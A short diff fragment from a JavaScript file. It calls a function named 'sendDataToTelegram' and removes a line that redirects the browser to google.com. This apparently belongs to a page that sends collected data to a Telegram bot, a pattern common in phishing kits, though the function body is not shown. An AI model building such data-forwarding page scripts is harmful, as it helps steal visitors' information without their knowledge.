@@ -131,4 +131,3 @@ async function sendDataToTelegram() {
 }
 
 sendDataToTelegram();
-window.location.href = "https://google.com";
